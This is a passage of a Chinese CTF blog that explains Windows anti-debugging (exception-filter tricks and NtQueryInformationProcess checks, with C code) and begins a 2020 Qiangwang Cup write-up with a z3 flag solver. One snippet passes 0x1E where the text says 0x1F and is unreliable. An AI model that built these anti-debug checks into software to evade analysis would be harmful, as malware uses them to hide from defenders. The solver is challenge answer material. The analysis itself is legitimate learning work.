<span class="hljs-title">ExceptFilter</span><span class="hljs-params">(LPEXCEPTION_POINTERS pExceptionInfo)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (pExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_INT_DIVIDE_BY_ZERO)<br>&#123;<br>pExceptionInfo-&gt;ContextRecord-&gt;Ecx = <span class="hljs-number">2</span>;<br><span class="hljs-keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;<br>&#125;<br><span class="hljs-keyword">return</span> EXCEPTION_CONTINUE_SEARCH;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>SetUnhandledExceptionFilter(ExceptFilter);<br><span class="hljs-keyword">int</span> val;<br>_try<br>&#123;<br>_asm<br>&#123;<br><span class="hljs-keyword">xor</span> edx,edx<br><span class="hljs-keyword">xor</span> ecx,ecx<br>mov eax,<span class="hljs-number">100</span><br>idiv ecx<br>mov val,eax<br>&#125;<br>&#125;<span class="hljs-comment">//GetExceptionInformation获取异常结构指针</span><br>_except(UnhandledExceptionFilter(GetExceptionInformation()))<br>&#123;<br><span class="hljs-comment">//printf(&quot;Exception-Handling-in-CTF\n&quot;);</span><br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;val = %d\n&quot;</span>, val);<br>getchar();<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>直接运行没啥问题</p><p><img src="image-20200826164241033.png" alt="image-20200826164241033"></p><p>但是调试的话就会闪退</p><p>在这种情况下只有程序不在调试时才会去处理异常</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">UnhandledExceptionFilter的执行流程：<br><br>1.通过NtQueryInformationProcess查询当前进程是否正在被调试，如果是，返回EXCEPTION_CONTINUE_SEARCH(0)，此时会进入第二轮分发<br>2.如果没有被调试：<br><span class="hljs-code">查询是否通过SetUnhandledExceptionFilter注册处理函数 如果有就调用</span><br><span class="hljs-code">如果没有通过SetUnhandledExceptionFilter注册处理函数 弹出窗口 让用户选择终止程序还是启动即时调试器</span><br><span class="hljs-code">如果用户没有启用即时调试器，那么该函数返回EXCEPTION_EXECUTE_HANDLER</span><br></code></pre></td></tr></table></figure><h3 id="NtQueryInformationProcess"><a href="#NtQueryInformationProcess" class="headerlink" title="NtQueryInformationProcess"></a>NtQueryInformationProcess</h3><p>这个函数是Ntdll.dll中一个原生态API，它用来提取一个给定进程的信息。它的第一个参数是进程句柄，第二个参数告诉我们它需要提取进程信息的类型。为第二个参数指定特定值并调用该函数，相关信息就会设置到第三个参数。第二个参数是一个枚举类型，其中与反调试有关的成员有ProcessDebugPort(0x7)、ProcessDebugObjectHandle(0x1E)和ProcessDebugFlags(0x1F)。例如将该参数置为ProcessDebugPort，如果进程正在被调试，则返回调试端口，否则返回0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">BOOL <span class="hljs-title">CheckDebug</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> debugPort = <span class="hljs-number">0</span>;<br>HMODULE hModule = LoadLibrary(<span class="hljs-string">&quot;Ntdll.dll&quot;</span>);<br>NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hModule, <span class="hljs-string">&quot;NtQueryInformationProcess&quot;</span>);<br>NtQueryInformationProcess(GetCurrentProcess(), <span class="hljs-number">0x7</span>, &amp;debugPort, <span class="hljs-keyword">sizeof</span>(debugPort), <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">return</span> debugPort != <span class="hljs-number">0</span>;<br>&#125;<br> <br><span class="hljs-function">BOOL <span class="hljs-title">CheckDebug</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>HANDLE hdebugObject = <span class="hljs-literal">NULL</span>;<br>HMODULE hModule = LoadLibrary(<span class="hljs-string">&quot;Ntdll.dll&quot;</span>);<br>NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hModule, <span class="hljs-string">&quot;NtQueryInformationProcess&quot;</span>);<br>NtQueryInformationProcess(GetCurrentProcess(), <span class="hljs-number">0x1E</span>, &amp;hdebugObject, <span class="hljs-keyword">sizeof</span>(hdebugObject), <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">return</span> hdebugObject != <span class="hljs-literal">NULL</span>;<br>&#125;<br> <br><span class="hljs-function">BOOL <span class="hljs-title">CheckDebug</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>BOOL bdebugFlag = TRUE;<br>HMODULE hModule = LoadLibrary(<span class="hljs-string">&quot;Ntdll.dll&quot;</span>);<br>NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hModule, <span class="hljs-string">&quot;NtQueryInformationProcess&quot;</span>);<br>NtQueryInformationProcess(GetCurrentProcess(), <span class="hljs-number">0x1E</span>, &amp;bdebugFlag, <span class="hljs-keyword">sizeof</span>(bdebugFlag), <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">return</span> bdebugFlag != TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><img src="image-20200826164943966.png" alt="image-20200826164943966"></p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2020强网杯</title>
    <link href="/2020/08/25/2020%E5%BC%BA%E7%BD%91%E6%9D%AF/"/>
    <url>/2020/08/25/2020%E5%BC%BA%E7%BD%91%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<p>太久没打ctf了</p><a id="more"></a><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="xx-warmup-obf"><a href="#xx-warmup-obf" class="headerlink" title="xx_warmup_obf"></a>xx_warmup_obf</h2><p>一堆花指令，去除后z3解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br>s = Solver()<br>key = [BitVec(<span class="hljs-string">&#x27;%d&#x27;</span>%i,<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">28</span>)]<br>s.add(key[<span class="hljs-number">0</span>] == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;f&#x27;</span>))<br>s.add(key[<span class="hljs-number">1</span>] == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;l&#x27;</span>))<br>s.add(key[<span class="hljs-number">2</span>] == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>))<br>s.add(key[<span class="hljs-number">3</span>] == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;g&#x27;</span>))<br>s.add(key[<span class="hljs-number">4</span>] == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;&#123;&#x27;</span>))<br>s.add(key[<span class="hljs-number">27</span>] == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;&#125;&#x27;</span>))<br>s.add(key[<span class="hljs-number">23</span>] == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;_&#x27;</span>))<br>s.add(<span class="hljs-number">23925</span> * key[<span class="hljs-number">0</span>] == <span class="hljs-number">2440350</span>)<br>s.add(<span class="hljs-number">281400</span> * key[<span class="hljs-number">1</span>] - <span class="hljs-number">7037</span> * key[<span class="hljs-number">0</span>] == <span class="hljs-number">29673426</span>)<br>s.add(<span class="hljs-number">174826</span> * key[<span class="hljs-number">0</span>] - <span class="hljs-number">255300</span> * key[<span class="hljs-number">2</span>] - <span class="hljs-number">283573</span> * key[<span class="hljs-number">1</span>] == -<span class="hljs-number">37557732</span>)<br>s.add( <span class="hljs-number">259881</span> * key[<span class="hljs-number">2</span>] + -<span class="hljs-number">98445</span> * key[<span class="hljs-number">1</span>] - <span class="hljs-number">276718</span> * key[<span class="hljs-number">0</span>] + <span class="hljs-number">4524</span> * key[<span class="hljs-number">3</span>] == -<span class="hljs-number">13182867</span> )<br>s.add( <span class="hljs-number">285576</span> * key[<span class="hljs-number">2</span>] + -<span class="hljs-number">274569</span> * key[<span class="hljs-number">3</span>] + <span class="hljs-number">94721</span> * key[<span class="hljs-number">0</span>] - <span class="hljs-number">228216</span> * key[<span class="hljs-number">4</span>] - <span class="hljs-number">60353</span> * key[<span class="hljs-number">1</span>] == -<span class="hljs-number">25506885</span> )<br>s.add( <span class="hljs-number">17630</span> * key[<span class="hljs-number">0</span>]+ -<span class="hljs-number">258397</span> * key[<span class="hljs-number">3</span>]+ -<span class="hljs-number">244952</span> * key[<span class="hljs-number">1</span>]+ -<span class="hljs-number">244086</span> * key[<span class="hljs-number">2</span>]+ -<span class="hljs-number">130259</span> * key[<span class="hljs-number">5</span>]- <span class="hljs-number">190371</span> * key[<span class="hljs-number">6</span>]- <span class="hljs-number">109961</span> * key[<span class="hljs-number">4</span>] == -<span class="hljs-number">111027477</span> )<br>s.add( <span class="hljs-number">117817</span> * key[<span class="hljs-number">5</span>] + <span class="hljs-number">268397</span> * key[<span class="hljs-number">7</span>] + -<span class="hljs-number">198175</span> * key[<span class="hljs-number">1</span>] + <span class="hljs-number">18513</span> * key[<span class="hljs-number">2</span>] + <span class="hljs-number">218992</span> * key[<span class="hljs-number">6</span>] + -<span class="hljs-number">6727</span> * key[<span class="hljs-number">3</span>] + <span class="hljs-number">228408</span> * key[<span class="hljs-number">0</span>] + <span class="hljs-number">224658</span> * key[<span class="hljs-number">4</span>] == <span class="hljs-number">78775012</span> )<br>s.add(<span class="hljs-number">260927</span> * key[<span class="hljs-number">3</span>]+ -<span class="hljs-number">5496</span> * key[<span class="hljs-number">1</span>]+ -<span class="hljs-number">294195</span> * key[<span class="hljs-number">4</span>]+ <span class="hljs-number">264844</span> * key[<span class="hljs-number">2</span>]+ <span class="hljs-number">125853</span> * key[<span class="hljs-number">5</span>] - <span class="hljs-number">153661</span> * key[<span class="hljs-number">0</span>] == <span class="hljs-number">13075233</span>  )<br>s.add( -<span class="hljs-number">196269</span> * key[<span class="hljs-number">8</span>] + -<span class="hljs-number">64473</span> * key[<span class="hljs-number">7</span>] + -<span class="hljs-number">142792</span> * key[<span class="hljs-number">5</span>] + <span class="hljs-number">171321</span> * key[<span class="hljs-number">4</span>] + -<span class="hljs-number">39259</span> * key[<span class="hljs-number">9</span>] + -<span class="hljs-number">269632</span> * key[<span class="hljs-number">2</span>] + <span class="hljs-number">229049</span> * key[<span class="hljs-number">6</span>] + <span class="hljs-number">96631</span> * key[<span class="hljs-number">3</span>] - <span class="hljs-number">280754</span> * key[<span class="hljs-number">1</span>] - <span class="hljs-number">168397</span> * key[<span class="hljs-number">0</span>] == -<span class="hljs-number">70797046</span> )<br>s.add( -<span class="hljs-number">235026</span> * key[<span class="hljs-number">4</span>] + <span class="hljs-number">162669</span> * key[<span class="hljs-number">8</span>] + -<span class="hljs-number">256202</span> * key[<span class="hljs-number">1</span>] + -<span class="hljs-number">32946</span> * key[<span class="hljs-number">9</span>] + -<span class="hljs-number">25900</span> * key[<span class="hljs-number">2</span>] + <span class="hljs-number">195039</span> * key[<span class="hljs-number">10</span>] + <span class="hljs-number">182157</span> * key[<span class="hljs-number">3</span>] + <span class="hljs-number">292706</span> * key[<span class="hljs-number">0</span>] + -<span class="hljs-number">93524</span> * key[<span class="hljs-number">5</span>] + <span class="hljs-number">121516</span> * key[<span class="hljs-number">6</span>] + <span class="hljs-number">165207</span> * key[<span class="hljs-number">7</span>] == <span class="hljs-number">28263339</span> )<br>s.add( -<span class="hljs-number">288418</span> * key[<span class="hljs-number">3</span>] + -<span class="hljs-number">218493</span> * key[<span class="hljs-number">7</span>] + -<span class="hljs-number">236774</span> * key[<span class="hljs-number">0</span>] + <span class="hljs-number">77982</span> * key[<span class="hljs-number">2</span>] + <span class="hljs-number">190784</span> * key[<span class="hljs-number">4</span>] + -<span class="hljs-number">84462</span> * key[<span class="hljs-number">1</span>] + <span class="hljs-number">92684</span> * key[<span class="hljs-number">8</span>] + <span class="hljs-number">52068</span> * key[<span class="hljs-number">5</span>] - <span class="hljs-number">243023</span> * key[<span class="hljs-number">6</span>] == -<span class="hljs-number">52520267</span> )<br>s.add( -<span class="hljs-number">262820</span> * key[<span class="hljs-number">4</span>] + <span class="hljs-number">9710</span> * key[<span class="hljs-number">10</span>] + <span class="hljs-number">71182</span> * key[<span class="hljs-number">12</span>] + -<span class="hljs-number">184125</span> * key[<span class="hljs-number">1</span>] + -<span class="hljs-number">100280</span> * key[<span class="hljs-number">6</span>] + <span class="hljs-number">62018</span> * key[<span class="hljs-number">11</span>] + <span class="hljs-number">141532</span> * key[<span class="hljs-number">9</span>] + -<span class="hljs-number">138253</span> * key[<span class="hljs-number">8</span>] + <span class="hljs-number">20489</span> * key[<span class="hljs-number">0</span>] + -<span class="hljs-number">214348</span> * key[<span class="hljs-number">2</span>] + <span class="hljs-number">162962</span> * key[<span class="hljs-number">3</span>] - <span class="hljs-number">93199</span> * key[<span class="hljs-number">7</span>] + <span class="hljs-number">147171</span> * key[<span class="hljs-number">5</span>] == -<span class="hljs-number">31396844</span> )<br>s.add( -<span class="hljs-number">131770</span> * key[<span class="hljs-number">6</span>] + -<span class="hljs-number">92964</span> * key[<span class="hljs-number">9</span>] + -<span class="hljs-number">111160</span> * key[<span class="hljs-number">8</span>] + -<span class="hljs-number">258188</span> * key[<span class="hljs-number">7</span>] + <span class="hljs-number">133728</span> * key[<span class="hljs-number">1</span>] + -<span class="hljs-number">272650</span> * key[<span class="hljs-number">5</span>] + -<span class="hljs-number">4940</span> * key[<span class="hljs-number">10</span>] + <span class="hljs-number">272791</span> * key[<span class="hljs-number">3</span>] + <span class="hljs-number">80519</span> * key[<span class="hljs-number">2</span>] + -<span class="hljs-number">165434</span> * key[<span class="hljs-number">11</span>] + <span class="hljs-number">50166</span> * key[<span class="hljs-number">0</span>] + <span class="hljs-number">148713</span> * key[<span class="hljs-number">4</span>] == -<span class="hljs-number">22025185</span> )<br>s.add(-<span class="hljs-number">55254</span> * key[<span class="hljs-number">8</span>]+ <span class="hljs-number">220404</span> * key[<span class="hljs-number">12</span>]+ -<span class="hljs-number">86956</span> * key[<span class="hljs-number">10</span>]+ -<span class="hljs-number">200702</span> * key[<span class="hljs-number">5</span>]+ -<span class="hljs-number">51437</span> * key[<span class="hljs-number">1</span>]+ <span class="hljs-number">25739</span> * key[<span class="hljs-number">6</span>]+ <span class="hljs-number">122945</span> * key[<span class="hljs-number">3</span>]+ <span class="hljs-number">116256</span> * key[<span class="hljs-number">7</span>]+ <span class="hljs-number">22859</span> * key[<span class="hljs-number">4</span>]+ -<span class="hljs-number">61880</span> * key[<span class="hljs-number">9</span>]+ -<span class="hljs-number">119275</span> * key[<span class="hljs-number">2</span>]+ -<span class="hljs-number">224754</span> * key[<span class="hljs-number">13</span>]- <span class="hljs-number">75412</span> * key[<span class="hljs-number">0</span>]+ <span class="hljs-number">59999</span> * key[<span class="hljs-number">11</span>] == -<span class="hljs-number">37063008</span>)<br>s.add(<span class="hljs-number">111310</span> * key[<span class="hljs-number">0</span>]+ <span class="hljs-number">198502</span> * key[<span class="hljs-number">3</span>]+ -<span class="hljs-number">189890</span> * key[<span class="hljs-number">13</span>]+ <span class="hljs-number">278745</span> * key[<span class="hljs-number">5</span>]+ <span class="hljs-number">157462</span> * key[<span class="hljs-number">9</span>]+ <span class="hljs-number">135809</span> * key[<span class="hljs-number">4</span>]+ -<span class="hljs-number">2621</span> * key[<span class="hljs-number">2</span>]+ <span class="hljs-number">67553</span> * key[<span class="hljs-number">6</span>]+ <span class="hljs-number">144834</span> * key[<span class="hljs-number">1</span>]+ -<span class="hljs-number">88326</span> * key[<span class="hljs-number">11</span>]+ -<span class="hljs-number">228149</span> * key[<span class="hljs-number">10</span>]+ <span class="hljs-number">233663</span> * key[<span class="hljs-number">14</span>]+ -<span class="hljs-number">249960</span> * key[<span class="hljs-number">12</span>]+ <span class="hljs-number">300012</span> * key[<span class="hljs-number">8</span>]+ <span class="hljs-number">91783</span> * key[<span class="hljs-number">7</span>] == <span class="hljs-number">93457153</span>)<br>s.add(<span class="hljs-number">15897</span> * key[<span class="hljs-number">0</span>]+ -<span class="hljs-number">11943</span> * key[<span class="hljs-number">13</span>]+ <span class="hljs-number">194067</span> * key[<span class="hljs-number">3</span>]+ <span class="hljs-number">125666</span> * key[<span class="hljs-number">2</span>]+ <span class="hljs-number">104421</span> * key[<span class="hljs-number">12</span>]+ -<span class="hljs-number">181764</span> * key[<span class="hljs-number">5</span>]+ -<span class="hljs-number">233813</span> * key[<span class="hljs-number">8</span>]+ -<span class="hljs-number">235783</span> * key[<span class="hljs-number">4</span>]+ <span class="hljs-number">230636</span> * key[<span class="hljs-number">11</span>]+ <span class="hljs-number">148005</span> * key[<span class="hljs-number">6</span>]+ -<span class="hljs-number">48167</span> * key[<span class="hljs-number">14</span>]+ -<span class="hljs-number">163572</span> * key[<span class="hljs-number">9</span>]+ <span class="hljs-number">54553</span> * key[<span class="hljs-number">10</span>]+ -<span class="hljs-number">129997</span> * key[<span class="hljs-number">1</span>]+ <span class="hljs-number">114175</span> * key[<span class="hljs-number">7</span>]- <span class="hljs-number">251681</span> * key[<span class="hljs-number">15</span>] == -<span class="hljs-number">36640750</span>)<br>s.add( -<span class="hljs-number">90549</span> * key[<span class="hljs-number">3</span>]+ -<span class="hljs-number">228520</span> * key[<span class="hljs-number">14</span>]+ <span class="hljs-number">34835</span> * key[<span class="hljs-number">10</span>]+ -<span class="hljs-number">203538</span> * key[<span class="hljs-number">15</span>]+ <span class="hljs-number">272318</span> * key[<span class="hljs-number">13</span>]+ -<span class="hljs-number">68478</span> * key[<span class="hljs-number">8</span>]+ <span class="hljs-number">22454</span> * key[<span class="hljs-number">9</span>]+ <span class="hljs-number">74128</span> * key[<span class="hljs-number">12</span>]+ <span class="hljs-number">70051</span> * key[<span class="hljs-number">6</span>]+ -<span class="hljs-number">289940</span> * key[<span class="hljs-number">7</span>]+ -<span class="hljs-number">52501</span> * key[<span class="hljs-number">5</span>]+ -<span class="hljs-number">1254</span> * key[<span class="hljs-number">4</span>]+ <span class="hljs-number">154844</span> * key[<span class="hljs-number">11</span>]+ <span class="hljs-number">254969</span> * key[<span class="hljs-number">2</span>]+ -<span class="hljs-number">39495</span> * key[<span class="hljs-number">1</span>]+ <span class="hljs-number">277429</span> * key[<span class="hljs-number">16</span>]- <span class="hljs-number">132752</span> * key[<span class="hljs-number">0</span>] == -<span class="hljs-number">6628237</span> )<br>s.add( <span class="hljs-number">128092</span> * key[<span class="hljs-number">11</span>]+ -<span class="hljs-number">5873</span> * key[<span class="hljs-number">17</span>]+ -<span class="hljs-number">144172</span> * key[<span class="hljs-number">3</span>]+ -<span class="hljs-number">148216</span> * key[<span class="hljs-number">13</span>]+ <span class="hljs-number">189050</span> * key[<span class="hljs-number">2</span>]+ <span class="hljs-number">66107</span> * key[<span class="hljs-number">5</span>]+ <span class="hljs-number">237987</span> * key[<span class="hljs-number">0</span>]+ -<span class="hljs-number">53271</span> * key[<span class="hljs-number">9</span>]+ -<span class="hljs-number">86968</span> * key[<span class="hljs-number">12</span>]+ -<span class="hljs-number">94616</span> * key[<span class="hljs-number">10</span>]+ -<span class="hljs-number">247882</span> * key[<span class="hljs-number">8</span>]+ -<span class="hljs-number">5107</span> * key[<span class="hljs-number">1</span>]+ <span class="hljs-number">55085</span> * key[<span class="hljs-number">15</span>]+ <span class="hljs-number">10792</span> * key[<span class="hljs-number">14</span>]+ -<span class="hljs-number">112241</span> * key[<span class="hljs-number">4</span>]+ -<span class="hljs-number">36680</span> * key[<span class="hljs-number">16</span>]- <span class="hljs-number">210718</span> * key[<span class="hljs-number">7</span>]- <span class="hljs-number">249539</span> * key[<span class="hljs-number">6</span>] == -<span class="hljs-number">53084017</span> )<br>s.add( -<span class="hljs-number">186088</span> * key[<span class="hljs-number">2</span>]+ <span class="hljs-number">19517</span> * key[<span class="hljs-number">13</span>]+ -<span class="hljs-number">65515</span> * key[<span class="hljs-number">5</span>]+ <span class="hljs-number">195447</span> * key[<span class="hljs-number">1</span>]+ <span class="hljs-number">145470</span> * key[<span class="hljs-number">14</span>]+ <span class="hljs-number">58825</span> * key[<span class="hljs-number">16</span>]+ <span class="hljs-number">272227</span> * key[<span class="hljs-number">15</span>]+ -<span class="hljs-number">155443</span> * key[<span class="hljs-number">8</span>]+ <span class="hljs-number">100397</span> * key[<span class="hljs-number">3</span>]+ -<span class="hljs-number">238861</span> * key[<span class="hljs-number">18</span>]+ <span class="hljs-number">84628</span> * key[<span class="hljs-number">7</span>]+ <span class="hljs-number">1337</span> * key[<span class="hljs-number">17</span>]+ <span class="hljs-number">156976</span> * key[<span class="hljs-number">12</span>]+ -<span class="hljs-number">74209</span> * key[<span class="hljs-number">4</span>]+ <span class="hljs-number">175077</span> * key[<span class="hljs-number">11</span>]+ <span class="hljs-number">134548</span> * key[<span class="hljs-number">0</span>]+ -<span class="hljs-number">280672</span> * key[<span class="hljs-number">6</span>]+ <span class="hljs-number">12264</span> * key[<span class="hljs-number">10</span>] + <span class="hljs-number">56937</span> * key[<span class="hljs-number">9</span>] == <span class="hljs-number">60764977</span> )<br>s.add( -<span class="hljs-number">58873</span> * key[<span class="hljs-number">7</span>]+ -<span class="hljs-number">283834</span> * key[<span class="hljs-number">9</span>]+ <span class="hljs-number">159144</span> * key[<span class="hljs-number">13</span>]+ -<span class="hljs-number">199631</span> * key[<span class="hljs-number">0</span>]+ <span class="hljs-number">54404</span> * key[<span class="hljs-number">16</span>]+ -<span class="hljs-number">190345</span> * key[<span class="hljs-number">8</span>]+ <span class="hljs-number">176103</span> * key[<span class="hljs-number">3</span>]+ <span class="hljs-number">137206</span> * key[<span class="hljs-number">17</span>]+ -<span class="hljs-number">170051</span> * key[<span class="hljs-number">6</span>]+ <span class="hljs-number">281718</span> * key[<span class="hljs-number">11</span>]+ <span class="hljs-number">137214</span> * key[<span class="hljs-number">14</span>]+ -<span class="hljs-number">104395</span> * key[<span class="hljs-number">19</span>]+ -<span class="hljs-number">122090</span> * key[<span class="hljs-number">4</span>]+ <span class="hljs-number">162065</span> * key[<span class="hljs-number">15</span>]+ -<span class="hljs-number">36580</span> * key[<span class="hljs-number">18</span>]+ <span class="hljs-number">245858</span> * key[<span class="hljs-number">12</span>]+ -<span class="hljs-number">18520</span> * key[<span class="hljs-number">10</span>]+ -<span class="hljs-number">138274</span> * key[<span class="hljs-number">1</span>]+ <span class="hljs-number">139185</span> * key[<span class="hljs-number">2</span>]- <span class="hljs-number">197535</span> * key[<span class="hljs-number">5</span>] == <span class="hljs-number">4912728</span> )<br>s.add( <span class="hljs-number">293345</span> * key[<span class="hljs-number">9</span>]+ <span class="hljs-number">63329</span> * key[<span class="hljs-number">13</span>]+ <span class="hljs-number">74470</span> * key[<span class="hljs-number">8</span>]+ -<span class="hljs-number">72984</span> * key[<span class="hljs-number">11</span>]+ -<span class="hljs-number">162393</span> * key[<span class="hljs-number">20</span>]+ <span class="hljs-number">150036</span> * key[<span class="hljs-number">15</span>]+ <span class="hljs-number">127913</span> * key[<span class="hljs-number">19</span>]+ <span class="hljs-number">181147</span> * key[<span class="hljs-number">16</span>]+ <span class="hljs-number">27751</span> * key[<span class="hljs-number">6</span>]+ -<span class="hljs-number">239133</span> * key[<span class="hljs-number">1</span>]+ -<span class="hljs-number">28337</span> * key[<span class="hljs-number">17</span>]+ <span class="hljs-number">108149</span> * key[<span class="hljs-number">0</span>]+ <span class="hljs-number">148338</span> * key[<span class="hljs-number">2</span>]+ <span class="hljs-number">38137</span> * key[<span class="hljs-number">18</span>]+ -<span class="hljs-number">199427</span> * key[<span class="hljs-number">14</span>]+ -<span class="hljs-number">97284</span> * key[<span class="hljs-number">4</span>]+ -<span class="hljs-number">39775</span> * key[<span class="hljs-number">3</span>]+ -<span class="hljs-number">109205</span> * key[<span class="hljs-number">10</span>]+ <span class="hljs-number">270604</span> * key[<span class="hljs-number">5</span>]- <span class="hljs-number">193384</span> * key[<span class="hljs-number">12</span>]+ <span class="hljs-number">168963</span> * key[<span class="hljs-number">7</span>] == <span class="hljs-number">45577809</span> )<br>s.add( <span class="hljs-number">45637</span> * key[<span class="hljs-number">6</span>]+ <span class="hljs-number">111858</span> * key[<span class="hljs-number">17</span>]+ <span class="hljs-number">244009</span> * key[<span class="hljs-number">19</span>]+ -<span class="hljs-number">188979</span> * key[<span class="hljs-number">8</span>]+ -<span class="hljs-number">220539</span> * key[<span class="hljs-number">16</span>]+ <span class="hljs-number">246135</span> * key[<span class="hljs-number">2</span>]+ -<span class="hljs-number">174651</span> * key[<span class="hljs-number">14</span>]+ <span class="hljs-number">179514</span> * key[<span class="hljs-number">4</span>]+ <span class="hljs-number">153071</span> * key[<span class="hljs-number">15</span>]+ -<span class="hljs-number">207716</span> * key[<span class="hljs-number">21</span>]+ <span class="hljs-number">64641</span> * key[<span class="hljs-number">7</span>]+ <span class="hljs-number">293781</span> * key[<span class="hljs-number">12</span>]+ <span class="hljs-number">263208</span> * key[<span class="hljs-number">10</span>]+ <span class="hljs-number">44675</span> * key[<span class="hljs-number">1</span>]+ <span class="hljs-number">131692</span> * key[<span class="hljs-number">3</span>]+ <span class="hljs-number">109605</span> * key[<span class="hljs-number">11</span>]+ <span class="hljs-number">293201</span> * key[<span class="hljs-number">5</span>]+ -<span class="hljs-number">98937</span> * key[<span class="hljs-number">9</span>]+ <span class="hljs-number">60492</span> * key[<span class="hljs-number">20</span>]+ -<span class="hljs-number">273571</span> * key[<span class="hljs-number">13</span>]- <span class="hljs-number">38942</span> * key[<span class="hljs-number">0</span>]- <span class="hljs-number">285946</span> * key[<span class="hljs-number">18</span>] == <span class="hljs-number">77539017</span> )<br>s.add( -<span class="hljs-number">160726</span> * key[<span class="hljs-number">9</span>]+ <span class="hljs-number">234971</span> * key[<span class="hljs-number">18</span>]+ <span class="hljs-number">32897</span> * key[<span class="hljs-number">4</span>]+ -<span class="hljs-number">206184</span> * key[<span class="hljs-number">11</span>]+ -<span class="hljs-number">86224</span> * key[<span class="hljs-number">20</span>]+ <span class="hljs-number">92896</span> * key[<span class="hljs-number">22</span>]+ <span class="hljs-number">295735</span> * key[<span class="hljs-number">15</span>]+ -<span class="hljs-number">58530</span> * key[<span class="hljs-number">0</span>]+ -<span class="hljs-number">197632</span> * key[<span class="hljs-number">13</span>]+ -<span class="hljs-number">21957</span> * key[<span class="hljs-number">17</span>]+ -<span class="hljs-number">43684</span> * key[<span class="hljs-number">6</span>]+ -<span class="hljs-number">141434</span> * key[<span class="hljs-number">10</span>]+ -<span class="hljs-number">194890</span> * key[<span class="hljs-number">1</span>]+ -<span class="hljs-number">148390</span> * key[<span class="hljs-number">21</span>]+ <span class="hljs-number">105293</span> * key[<span class="hljs-number">14</span>]+ <span class="hljs-number">76213</span> * key[<span class="hljs-number">3</span>]+ <span class="hljs-number">9791</span> * key[<span class="hljs-number">12</span>]+ -<span class="hljs-number">258754</span> * key[<span class="hljs-number">8</span>]+ <span class="hljs-number">59119</span> * key[<span class="hljs-number">16</span>]+ <span class="hljs-number">255675</span> * key[<span class="hljs-number">2</span>]+ -<span class="hljs-number">130852</span> * key[<span class="hljs-number">7</span>]- <span class="hljs-number">71444</span> * key[<span class="hljs-number">5</span>]+ <span class="hljs-number">127285</span> * key[<span class="hljs-number">19</span>] == -<span class="hljs-number">38197685</span> )<br>s.add( <span 